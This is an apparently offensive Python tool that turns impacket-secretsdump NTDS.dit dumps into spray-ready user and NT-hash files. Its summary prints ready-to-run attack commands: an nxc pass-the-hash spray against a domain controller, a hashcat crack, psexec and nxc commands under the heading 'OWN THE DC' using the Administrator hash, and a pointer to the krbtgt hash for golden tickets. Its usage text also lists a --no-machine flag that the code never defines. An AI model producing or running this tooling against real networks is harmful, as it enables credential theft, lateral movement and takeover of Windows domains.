#!/usr/bin/env python3
"""
parse_ntds.py  v1.0  —  secretsdump / NTDS.dit output parser
Turns  impacket-secretsdump  output into spray-ready files.

Handles lines like:
  Administrator:500:aad3b435...:12579b1666d4ac10f0f59f300776495f:::
  DOMAIN\\user:1104:aad3b435...:<nthash>:::

Outputs (next to the input, or --outdir):
  <stem>_users.txt   one username per line   (aligned with _nt.txt)
  <stem>_nt.txt      one NT hash per line    (aligned with _users.txt)
  <stem>_ref.txt     user:hash pairs         (john --username / reference)
  <stem>_crack.txt   unique NT hashes        (hashcat -m 1000)

Then it PRINTS the exact pass-the-hash spray command.

Usage:
  python3 parse_ntds.py dump.txt
  python3 parse_ntds.py dump.txt --dc 192.168.1.10
  impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL | python3 parse_ntds.py -
  python3 parse_ntds.py dump.txt --no-machine   # drop COMPUTER$ accounts (default)
  python3 parse_ntds.py dump.txt --machines     # keep COMPUTER$ accounts
"""
from __future__ import annotations
import argparse
import re
import sys
from pathlib import Path

NULL_NT = {
    '31d6cfe0d16ae931b73c59d7e0c089c0',  # empty password
}
LM_PLACEHOLDER = 'aad3b435b51404eeaad3b435b51404ee'

ANSI   = sys.stdout.isatty()
GREEN  = '\033[92m' if ANSI else ''
YELLOW = '\033[93m' if ANSI else ''
CYAN   = '\033[96m' if ANSI else ''
DIM    = '\033[2m'  if ANSI else ''
BOLD   = '\033[1m'  if ANSI else ''
RESET  = '\033[0m'  if ANSI else ''

# secretsdump hash line:  user:rid:lm:nt:::
HASH_LINE = re.compile(
    r'^(?P<user>[^:]+):(?P<rid>\d+):(?P<lm>[0-9a-fA-F]{32}):(?P<nt>[0-9a-fA-F]{32}):::'
)


class Acct:
    __slots__ = ('user', 'rid', 'nt', 'is_machine')

    def __init__(self, user, rid, nt):
        # strip DOMAIN\ prefix if present, keep bare sam name
        self.user = user.split('\\')[-1].strip()
        self.rid = int(rid)
        self.nt = nt.lower()
        self.is_machine = self.user.endswith('$')

    @property
    def is_krbtgt(self):
        return self.user.lower() == 'krbtgt'

    @property
    def is_empty(self):
        return self.nt in NULL_NT


def parse(text: str) -> list[Acct]:
    accts, seen = [], set()
    for line in text.splitlines():
        m = HASH_LINE.match(line.strip())
        if not m:
            continue
        key = (m.group('user').lower(), m.group('nt'))
        if key in seen:
            continue
        seen.add(key)
        accts.append(Acct(m.group('user'), m.group('rid'), m.group('nt')))
    return accts


def write_outputs(accts, outdir, stem):
    users, nts, refs, crack = [], [], [], []
    crack_seen = set()
    for a in accts:
        users.append(a.user)
        nts.append(a.nt)
        refs.append(f'{a.user}:{a.nt}')
        if a.nt not in crack_seen and not a.is_empty:
            crack_seen.add(a.nt)
            crack.append(a.nt)

    paths = {
        'users': outdir / f'{stem}_users.txt',
        'nt':    outdir / f'{stem}_nt.txt',
        'ref':   outdir / f'{stem}_ref.txt',
        'crack': outdir / f'{stem}_crack.txt',
    }
    for key, lines in [('users', users), ('nt', nts), ('ref', refs), ('crack', crack)]:
        paths[key].write_text('\n'.join(lines) + ('\n' if lines else ''))
    return paths


def summary(accts, paths, dc):
    users_path = paths['users']
    nt_path = paths['nt']
    machines = [a for a in accts if a.is_machine]
    krbtgt = next((a for a in accts if a.is_krbtgt), None)
    admin = next((a for a in accts if a.rid == 500), None)

    print(f'\n{BOLD}parse_ntds  —  {len(accts)} accounts{RESET}')
    print('─' * 62)
    print(f'  {CYAN}Users{RESET}      : {len([a for a in accts if not a.is_machine])}')
    print(f'  {CYAN}Machines{RESET}   : {len(machines)}  {DIM}(COMPUTER$){RESET}')
    if admin:
        print(f'  {YELLOW}RID 500{RESET}    : {admin.user}:{admin.nt}  {DIM}(pass-the-hash this){RESET}')
    if krbtgt:
        print(f'  {YELLOW}krbtgt{RESET}     : {krbtgt.nt}  {DIM}(golden ticket){RESET}')
    print()
    print(f'{YELLOW}── FILES ────────────────────────────────────────────────{RESET}')
    for k, p in paths.items():
        print(f'  {p}')
    print()
    print(f'{YELLOW}── SPRAY (pass-the-hash, aligned line-by-line) ──────────{RESET}')
    dc_str = dc if dc else '<DC-ip>'
    print(f'  {GREEN}nxc smb {dc_str} -u {users_path.name} -H {nt_path.name} '
          f'--no-bruteforce --continue-on-success{RESET}')
    print(f'  {DIM}[+] = valid  |  (Pwn3d!) = admin  |  '
          f'LOGON_FAILURE/EXPIRED = stale backup{RESET}')
    print()
    print(f'{YELLOW}── CRACK (optional — AD hashes rarely fall) ─────────────{RESET}')
    print(f'  {DIM}hashcat -m 1000 {paths["crack"].name} '
          f'/usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule{RESET}')
    if admin:
        print()
        print(f'{YELLOW}── OWN THE DC (if RID 500 hash is still valid) ──────────{RESET}')
        print(f'  {DIM}nxc smb {dc_str} -u Administrator -H {admin.nt}{RESET}')
        print(f'  {DIM}impacket-psexec Administrator@{dc_str} -hashes :{admin.nt}{RESET}')
    print()


def main():
    ap = argparse.ArgumentParser(
        description='Parse secretsdump/NTDS output into spray-ready files.',
        formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument('infile', help='secretsdump output file (- for stdin)')
    ap.add_argument('-o', '--outdir', default=None)
    ap.add_argument('--dc', default=None, help='DC IP to bake into printed commands')
    ap.add_argument('--machines', action='store_true',
                    help='keep COMPUTER$ accounts (default: drop them)')
    args = ap.parse_args()

    if args.infile == '-':
        text, stem, outdir = sys.stdin.read(), 'ntds', Path('.')
    else:
        p = Path(args.infile)
        if not p.exists():
            sys.exit(f'File not found: {p}')
        text, stem, outdir = p.read_text(errors='replace'), p.stem, p.parent

    if args.outdir:
        outdir = Path(args.outdir); outdir.mkdir(parents=True, exist_ok=True)

    accts = parse(text)
    if not args.machines:
        accts = [a for a in accts if not a.is_machine]
    if not accts:
        sys.exit('No NTDS hash lines found. Is this secretsdump output?')

    paths = write_outputs(accts, outdir, stem)
    summary(accts, paths, args.dc)


if __name__ == '__main__':
    main()
